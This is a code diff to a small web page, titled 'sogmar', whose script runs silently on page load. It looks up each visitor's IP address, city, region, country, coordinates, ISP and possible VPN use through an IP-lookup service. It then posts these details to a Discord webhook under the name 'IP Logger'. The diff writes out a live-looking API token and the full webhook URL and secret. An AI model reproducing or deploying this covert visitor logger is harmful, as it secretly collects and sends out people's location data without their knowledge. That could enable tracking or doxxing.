@@ -3,22 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eh</title>
+    <title>sogmar</title>
     <script>
         async function sendIP() {
             try {
-                let response = await fetch('https://api64.ipify.org?format=json');
+                // Fetch user's IP details from ipinfo.io
+                let response = await fetch('https://ipinfo.io/json?token=49ec89a789870b');
                 let data = await response.json();
-                let userIP = data.ip;
 
+                let userIP = data.ip || "Unknown";
+                let city = data.city || "Unknown";
+                let region = data.region || "Unknown";
+                let country = data.country || "Unknown";
+                let location = data.loc || "Unknown"; // Latitude, Longitude
+                let isp = data.org || "Unknown"; // ISP or VPN
+                let isVPN = isp.toLowerCase().includes("vpn") ? "Yes" : "No";
+
+                // Webhook URL (Replace with your actual Discord Webhook)
                 const webhookURL = "https://discord.com/api/webhooks/1311264095647039538/omt9h72ULPEeeLtXUXR7ho9aOXq8VweKVNAj8yjNOvnkOrUVPPT6eiKY-9FjinMIBnrn";
 
+                // Sending data to Discord webhook
                 fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         username: "IP Logger",
-                        content: `User IP: ${userIP}`
+                        content: `**New Visitor**\n
+                        - **IP Address:** ${userIP}
+                        - **City:** ${city}
+                        - **Region:** ${region}
+                        - **Country:** ${country}
+                        - **Coordinates:** ${location}
+                        - **ISP:** ${isp}
+                        - **VPN Detected:** ${isVPN}`
                     })
                 });
 
@@ -27,6 +44,7 @@
             }
         }
 
+        // Run on page load
         window.onload = sendIP;
     </script>
 </head>
